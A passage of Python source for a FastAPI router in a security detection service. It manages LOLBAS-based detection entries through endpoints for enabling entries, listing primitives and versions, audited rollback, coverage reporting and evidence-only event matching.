    ten, pid, pkd = _principal(request)
    doc = _entries().find_one({"name": name})
    if not doc:
        raise HTTPException(status_code=404, detail="entry not found")
    _entries().update_one({"_id": doc["_id"]},
                                        {"$pull": {"disabled_tenants": ten}})
    audit = emit_audit(tenant_id=ten, principal_id=pid, principal_kind=pkd,
                                action="LOLBAS_ENTRY_ENABLED",
                                resource_kind="lolbas_entry", resource_id=name)
    return {"ok": True, "data": {"name": name, "enabled": True},
                 "audit_ref": audit["id"]}


@router.get("/primitives")
def list_primitives(kind: str | None = Query(None),
                                  entry: str | None = Query(None),
                                  skip: int = Query(0, ge=0),
                                  limit: int = Query(500, ge=1, le=5000)):
    if _primitives() is None:
        return {"ok": False, "error": {"code": "STORAGE_UNAVAILABLE"}}
    q: dict[str, Any] = {}
    if kind:  q["kind"]       = kind
    if entry: q["entry_name"] = entry
    total = _primitives().count_documents(q)
    cur = _primitives().find(q, {"_id": 0}).skip(skip).limit(limit)
    rows = list(cur)
    return {"ok": True, "data": {"primitives": rows, "count": len(rows),
                                                      "total": total}}


@router.get("/versions")
def list_versions(limit: int = Query(20, ge=1, le=200)):
    if _versions() is None:
        return {"ok": False, "error": {"code": "STORAGE_UNAVAILABLE"}}
    cur = _versions().find({}, {"_id": 0}).sort("synced_at", DESCENDING).limit(limit)
    return {"ok": True, "data": {"versions": list(cur)}}


@router.post("/rollback/{version_id}")
def rollback(version_id: str, request: Request):
    """Mark a previously-COMPLETE version as active.  Does NOT re-fetch
    upstream — it is intended for quickly reverting when a bad sync
    is caught in production.  Data on disk for that version is still
    the freshly-indexed set; rollback only flips `active` markers and
    audit-emits the operator's intent.
    """
    if _versions() is None:
        raise HTTPException(status_code=503, detail="storage unavailable")
    ten, pid, pkd = _principal(request)
    target = _versions().find_one({"id": version_id})
    if not target:
        raise HTTPException(status_code=404, detail="version not found")
    if target.get("outcome") != "COMPLETE":
        raise HTTPException(status_code=409,
            detail="cannot roll back to a non-COMPLETE version")
    _versions().update_many({"active": True}, {"$set": {"active": False}})
    _versions().update_one({"id": version_id}, {"$set": {"active": True}})
    audit = emit_audit(tenant_id=ten, principal_id=pid, principal_kind=pkd,
                                action="LOLBAS_ROLLED_BACK",
                                resource_kind="content_pack",
                                resource_id=version_id)
    return {"ok": True, "data": {"active_version": version_id},
                 "audit_ref": audit["id"]}


@router.get("/coverage")
def coverage(request: Request):
    if _versions() is None:
        raise HTTPException(status_code=503, detail="storage unavailable")
    active = _versions().find_one({"active": True}, {"_id": 0})
    if not active:
        return {"ok": True, "data": {"status": "NEVER_SYNCED"}}
    return {"ok": True, "data": {
        "upstream_count":   active.get("upstream_count"),
        "imported":         active.get("imported"),
        "valid":            active.get("valid"),
        "invalid":          active.get("invalid"),
        "coverage_pct":     active.get("coverage_pct"),
        "upstream_version": active.get("upstream_version"),
        "synced_at":        active.get("synced_at"),
        "stages":           active.get("stages"),
        "diff":             active.get("diff"),
    }}


@router.post("/match")
def match(body: MatchBody, request: Request):
    """Deterministic evidence-only matcher.  Never returns a verdict."""
    if _primitives() is None:
        raise HTTPException(status_code=503, detail="storage unavailable")
    ten, _, _ = _principal(request)
    hits = _match_event(ten, body.model_dump(exclude_none=True))
    return {"ok": True, "data": {"hits": hits, "count": len(hits),
                                                    "note": "primitives contribute EVIDENCE, "
                                                                "not a verdict.  The correlation engine "
                                                                "decides the outcome."}}
